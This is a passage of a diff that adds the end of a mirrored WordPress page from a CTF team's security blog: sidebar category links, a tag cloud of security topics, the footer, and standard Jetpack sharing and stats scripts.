+	<li class="cat-item cat-item-31"><a href="../../../../category/forensic/index.html">forensic</a>
+</li>
+	<li class="cat-item cat-item-15"><a href="../../../../category/misc/index.html">misc</a>
+</li>
+	<li class="cat-item cat-item-25"><a href="../../../../category/pwn/index.html">pwn</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="../../../../category/re/index.html">re</a>
+</li>
+	<li class="cat-item cat-item-38"><a href="../../../../category/research/index.html">research</a>
+</li>
+	<li class="cat-item cat-item-47"><a href="../../../../category/smartcontract/index.html">smartcontract</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="../../../../category/uncategorized/index.html">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="../../../../category/vietnamese/index.html">vietnamese</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="../../../../category/web/index.html">web</a>
+</li>
+	<li class="cat-item cat-item-30"><a href="../../../../category/whitehat/index.html">whitehat</a>
+</li>
+		</ul>
+			</aside><aside id="tag_cloud-3" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="../../../../tag/2015/index.html" class="tag-cloud-link tag-link-36 tag-link-position-1" style="font-size: 8pt;" aria-label="2015 (1 item)">2015</a>
+<a href="../../../../tag/babyphd/index.html" class="tag-cloud-link tag-link-35 tag-link-position-2" style="font-size: 8pt;" aria-label="babyphd (1 item)">babyphd</a>
+<a href="../../../../tag/backdoorctf/index.html" class="tag-cloud-link tag-link-33 tag-link-position-3" style="font-size: 8pt;" aria-label="backdoorCTF (1 item)">backdoorCTF</a>
+<a href="../../../../tag/crypto/index.html" class="tag-cloud-link tag-link-14 tag-link-position-4" style="font-size: 22pt;" aria-label="crypto (3 items)">crypto</a>
+<a href="../../../../tag/css/index.html" class="tag-cloud-link tag-link-42 tag-link-position-5" style="font-size: 8pt;" aria-label="css (1 item)">css</a>
+<a href="../../../../tag/gaylord/index.html" class="tag-cloud-link tag-link-34 tag-link-position-6" style="font-size: 8pt;" aria-label="gaylord (1 item)">gaylord</a>
+<a href="../../../../tag/heap/index.html" class="tag-cloud-link tag-link-37 tag-link-position-7" style="font-size: 8pt;" aria-label="heap (1 item)">heap</a>
+<a href="../../../../tag/list-linked/index.html" class="tag-cloud-link tag-link-28 tag-link-position-8" style="font-size: 8pt;" aria-label="list-linked (1 item)">list-linked</a>
+<a href="../../../../tag/malware/index.html" class="tag-cloud-link tag-link-43 tag-link-position-9" style="font-size: 8pt;" aria-label="malware (1 item)">malware</a>
+<a href="../../../../tag/mughthesec/index.html" class="tag-cloud-link tag-link-45 tag-link-position-10" style="font-size: 8pt;" aria-label="Mughthesec (1 item)">Mughthesec</a>
+<a href="../../../../tag/operatormac/index.html" class="tag-cloud-link tag-link-44 tag-link-position-11" style="font-size: 8pt;" aria-label="OperatorMac (1 item)">OperatorMac</a>
+<a href="../../../../tag/pwn/index.html" class="tag-cloud-link tag-link-27 tag-link-position-12" style="font-size: 8pt;" aria-label="pwn (1 item)">pwn</a>
+<a href="../../../../tag/re/index.html" class="tag-cloud-link tag-link-26 tag-link-position-13" style="font-size: 8pt;" aria-label="re (1 item)">re</a>
+<a href="../../../../tag/side-channel/index.html" class="tag-cloud-link tag-link-29 tag-link-position-14" style="font-size: 8pt;" aria-label="side-channel (1 item)">side-channel</a>
+<a href="../../../../tag/sqli/index.html" class="tag-cloud-link tag-link-41 tag-link-position-15" style="font-size: 8pt;" aria-label="sqli (1 item)">sqli</a>
+<a href="../../../../tag/unserialize/index.html" class="tag-cloud-link tag-link-40 tag-link-position-16" style="font-size: 8pt;" aria-label="unserialize (1 item)">unserialize</a>
+<a href="../../../../tag/xss/index.html" class="tag-cloud-link tag-link-39 tag-link-position-17" style="font-size: 8pt;" aria-label="xss (1 item)">xss</a></div>
+</aside>			</div><!-- .widget-area -->
+		</div><!-- .sidebar-inner -->
+	</div><!-- #tertiary -->
+
+		</div><!-- #main -->
+		<footer id="colophon" class="site-footer" role="contentinfo">
+			
+			<div class="site-info">
+								<a href="https://wordpress.org/">Proudly powered by WordPress</a>
+			</div><!-- .site-info -->
+		</footer><!-- #colophon -->
+	</div><!-- #page -->
+
+		<div style="display:none">
+	<div class="grofile-hash-map-dd7fceff26d16f923d65217300e0799e">
+	</div>
+	<div class="grofile-hash-map-ac688f3e2be1ad288facf89ebac47ec0">
+	</div>
+	<div class="grofile-hash-map-dd7fceff26d16f923d65217300e0799e">
+	</div>
+	</div>
+
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"https:\/\/babyphd.net\/2016\/11\/24\/hackyou-ctf-su-2016\/":627};
+	</script>
+				<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/photon/photon.min.js%3Fver=20190201'></script>
+<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=202333'></script>
+<script type='text/javascript' src='../../../../wp-content/themes/twentythirteen/js/functions.js%3Fver=20160717'></script>
+<script type='text/javascript' src='../../../../wp-includes/js/wp-embed.min.js%3Fver=5.2.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js%3Fver=7.5.2'></script>
+<script type='text/javascript'>
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+</script>
+<script type='text/javascript' src='https://stats.wp.com/e-202333.js' async='async' defer='defer'></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:7.5.2',blog:'104079289',post:'627',tz:'0',srv:'babyphd.net'} ]);
+	_stq.push([ 'clickTrackerInit', '104079289', '627' ]);
+</script>
+</body>
+</html>
